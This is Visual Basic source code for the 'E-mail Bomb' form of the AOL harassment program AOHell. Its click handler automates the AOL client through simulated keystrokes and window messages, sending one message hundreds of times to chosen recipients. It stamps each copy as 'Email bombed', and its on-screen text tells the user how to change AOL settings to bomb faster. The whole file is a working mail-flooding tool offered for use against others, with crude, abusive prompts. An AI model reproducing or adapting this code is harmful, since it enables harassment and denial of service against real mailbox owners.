VERSION 2.00
Begin Form ebomb 
   BackColor       =   &H00C0C0C0&
   BorderStyle     =   3  'Fixed Double
   Caption         =   "E-mail Bomb"
   ClientHeight    =   3750
   ClientLeft      =   1440
   ClientTop       =   2280
   ClientWidth     =   6585
   ControlBox      =   0   'False
   Height          =   4155
   HelpContextID   =   15
   Icon            =   EBOMB.FRX:0000
   Left            =   1380
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   3750
   ScaleWidth      =   6585
   Top             =   1935
   Width           =   6705
   Begin SSCommand Command3D3 
      BevelWidth      =   3
      Caption         =   "&Help"
      Font3D          =   3  'Inset w/light shading
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   9.75
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      ForeColor       =   &H00000000&
      Height          =   375
      HelpContextID   =   15
      Left            =   4320
      TabIndex        =   13
      Top             =   3240
      Width           =   855
   End
   Begin VBMsg VBMsg1 
      Height          =   420
      Left            =   6360
      MessageCount    =   EBOMB.FRX:0302
      MessageList     =   EBOMB.FRX:0304
      MessageTypes    =   0  'Selected Messages
      PostDefault     =   0   'False
      Top             =   840
      Width           =   420
   End
   Begin TextBox Text1 
      Height          =   285
      Left            =   2160
      MaxLength       =   4
      TabIndex        =   9
      Text            =   "500"
      Top             =   3240
      Width           =   615
   End
   Begin TextBox Text3 
      FontBold        =   0   'False
      FontItalic      =   0   'False
      FontName        =   "Arial"
      FontSize        =   8.25
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   1095
      Left            =   720
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   8
      Top             =   240
      Width           =   2055
   End
   Begin SSCommand Command3D2 
      BevelWidth      =   3
      Caption         =   "&Cancel"
      Font3D          =   3  'Inset w/light shading
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   9.75
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      ForeColor       =   &H00000000&
      Height          =   375
      Left            =   5280
      TabIndex        =   7
      Top             =   3240
      Width           =   1095
   End
   Begin SSCommand Command3D1 
      BevelWidth      =   3
      Caption         =   "&Begin Bomb"
      Font3D          =   3  'Inset w/light shading
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   9.75
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      ForeColor       =   &H00000000&
      Height          =   375
      Left            =   3000
      TabIndex        =   3
      Top             =   3240
      Width           =   1215
   End
   Begin TextBox Text2 
      FontBold        =   0   'False
      FontItalic      =   0   'False
      FontName        =   "Arial"
      FontSize        =   9.75
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   735
      Left            =   240
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   2
      Text            =   " "
      Top             =   2280
      Width           =   6135
   End
   Begin TextBox Text5 
      FontBold        =   0   'False
      FontItalic      =   0   'False
      FontName        =   "Arial"
      FontSize        =   9.75
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   360
      Left            =   1080
      MaxLength       =   25
      TabIndex        =   1
      Text            =   " "
      Top             =   1800
      Width           =   5295
   End
   Begin TextBox text4 
      Height          =   855
      Left            =   7440
      MaxLength       =   95
      MultiLine       =   -1  'True
      TabIndex        =   4
      Top             =   360
      Visible         =   0   'False
      Width           =   1935
   End
   Begin Label Label5 
      BackColor       =   &H8000000F&
      Caption         =   "MUST"
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   8.25
      FontStrikethru  =   0   'False
      FontUnderline   =   -1  'True
      Height          =   255
      Left            =   3360
      TabIndex        =   10
      Top             =   120
      Width           =   495
   End
   Begin Label Label2 
      AutoSize        =   -1  'True
      BackColor       =   &H8000000F&
      Caption         =   "You"
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   9.75
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   225
      Left            =   3000
      TabIndex        =   12
      Top             =   120
      Width           =   315
   End
   Begin Label Label4 
      BackColor       =   &H00C0C0C0&
      Caption         =   "Send this many times:"
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   8.25
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   255
      Left            =   240
      TabIndex        =   6
      Top             =   3240
      Width           =   1815
   End
   Begin Label Label3 
      BackColor       =   &H00C0C0C0&
      Caption         =   "Subject:"
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   9.75
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   255
      Left            =   240
      TabIndex        =   5
      Top             =   1800
      Width           =   735
   End
   Begin Label Label1 
      BackColor       =   &H00C0C0C0&
      Caption         =   "TO:"
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   8.25
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   255
      Left            =   240
      TabIndex        =   0
      Top             =   240
      Width           =   375
   End
   Begin Label Label6 
      BackColor       =   &H8000000F&
      Caption         =   "                     set your preferences so that it _won't_ close mail after it has been sent.  (CTRL + = |Mail) This GREATLY speeds up the mail bombing, and you can't use this without doing that!  When it's done, change your preferences back, before you use the mass mailer."
      FontBold        =   -1  'True
      FontItalic      =   0   'False
      FontName        =   "Times New Roman"
      FontSize        =   9.75
      FontStrikethru  =   0   'False
      FontUnderline   =   0   'False
      Height          =   1575
      Left            =   3000
      TabIndex        =   11
      Top             =   120
      Width           =   3495
      WordWrap        =   -1  'True
   End
End
Declare Function SetWindowPos Lib "User" (ByVal h%, ByVal hb%, ByVal X%, ByVal Y%, ByVal cx%, ByVal cy%, ByVal f%) As Integer


Const SWP_NOMOVE = 2
Const SWP_NOSIZE = 1
Const FLAGS = SWP_NOMOVE Or SWP_NOSIZE
Const HWND_TOPMOST = -1
Const HWND_NOTOPMOST = -2

Sub Command3D1_Click ()
If SignStatus = 0 Then
MsgBox "You must be signed on to AOL before you can use this feature!", 16, "Not Signed On!"
Exit Sub
End If
GoTo begin2

titfuck:
MsgBox "An Error has occurred, please make sure you have completely filled in the form.  If you have, please fill out a bug report explaining the problem."
Exit Sub
begin2:
  On Error GoTo titfuck
 zzag1 = Text1


If Text3 = "" Then
MsgBox "Please enter in the names you wish to bomb."
Exit Sub
End If
If Text1 = "" Then
MsgBox "Please specify how many times AOHell should mail the message."
Exit Sub
End If
If Text2.Text = "" Then
MsgBox "Please enter what you want to be in the message."
Exit Sub
End If

'Messages based on amount

 If Text1 < 150 Then
 MsgBox "You fucking pussy! What the hell kind of Email bomb is that?"
 End If

    If Text1 > 501 Then
    Response = MsgBox("This will take a while, are you sure you want to continue?", 36, "Email Bomb")
    'Possible Response values: 6--YES, 7--NO.
    If Response = 6 Then GoTo sHit
    ElseIf Response = 7 Then Exit Sub
    End If
   Response = MsgBox("You must make sure that your AOL settings are set so it WILL NOT close mail after it has been sent.  Under the ""Members"" menu, click on  ""Set Preferences"".  Then choose ""Mail"".  Uncheck the box that says ""Close mail after it has been sent.""  So it won't close mail after it has been sent.  Do NOT hit the OK button to this message unless your settings are like this.", 65, "AOL Settings")
   'Possible Response values: 1--IDOK, 2--CANCEL.
   If Response = 1 Then GoTo sHit
   If Response = 2 Then Exit Sub
  


sHit:



ebstat.Show
  
  ebstat.Label3.Caption = 0
  ebstat.Label4.Caption = zzag1

 

ebomb.Hide
ebstat.Panel3D1.Caption = "Bombing: " + Text3.Text + "..."


 AppActivate "America  Online"

 DoEvents
  
 'Text2.Text + "     " + "****Email Bombed with " + cryptname + "****"

 SendKeys "%MC"
 DoEvents
 Call Pause(.5)
        thiswin% = FindWindow(0, "America  Online")
        ComposeHand = FindChildByTitle(thiswin%, "Compose Mail")
        SendButton2 = VBEnumChildWindows(ComposeHand, 2)
        ToField = VBEnumChildWindows(ComposeHand, 10)
        SubField = VBEnumChildWindows(ComposeHand, 14)
        MsgField = VBEnumChildWindows(ComposeHand, 17)
        VBMsg1.SubClasshWnd = SendButton2

lint = 20000 '7500
lpstring = Text3.Text

ToText = SendMessageByString(ToField, WM_SETTEXT, lint, lpstring) ',lint
 DoEvents
 
 lpstring = Text5.Text
SubText = SendMessageByString(SubField, WM_SETTEXT, lint, lpstring) ',lint
 DoEvents
  ret = Chr$(13) + Chr$(10)
  lpstring = Text2.Text + ret + "***Email bombed with " + cryptname + "***"

MsgText = SendMessageByString(MsgField, WM_SETTEXT, lint, lpstring) ',lint
 DoEvents
  Call Pause(.3)

 For Y = 1 To Text1

     VBMsg1.SendMessage = WM_LBUTTONDOWN
     VBMsg1.SendMessage = WM_LBUTTONUP
    DoEvents

 thiswin1% = FindWindow(0, "America Online")
 While thiswin1% = 0
 If qui = 1000 Then GoTo endit1
 DoEvents
 DoEvents
 dodo = 4 + 4
 DoEvents
 DoEvents
 thiswin1% = FindWindow(0, "America Online")
 Wend
    DoEvents
    Call Pause(.2)
    SendKeys "{ENTER}"
    
ebstat.Label3.Caption = ebstat.Label3.Caption + 1
ebstat.Label4.Caption = ebstat.Label4.Caption - 1

lala6 = ebstat.Label3.Caption

ebstat.Percent2.Percent = lala6 / zzag1 * 100
 
    
 Next Y

endit1:

ebstat.Hide
ebomb.Show
GoTo endall

endall:

If ebstat.Check3D1.Value = True Then
AppActivate "America  Online"
SendKeys "%{f4}"
Call Pause(2)
SendKeys "y"
Call Pause(3)
End If
Unload ebstat
qui = 0
Text5.SetFocus
MsgBox "Make sure you change your settings back so it WILL close mail after it has been sent **Before you use the Mass Mail feature***", 64, "AOL Settings"

End Sub

Sub Command3D2_Click ()
Unload Me
End Sub

Sub Command3D3_Click ()
SendKeys "{F1}"
DoEvents

End Sub

Sub Form_Load ()
Dim Success As Integer

Success% = SetWindowPos%(ebomb.hWnd, HWND_TOPMOST, 0, 0, 0, 0, FLAGS)
qui = 0

End Sub

Sub Form_Resize ()
Dim Success As Integer

Success% = SetWindowPos%(ebomb.hWnd, HWND_TOPMOST, 0, 0, 0, 0, FLAGS)

End Sub

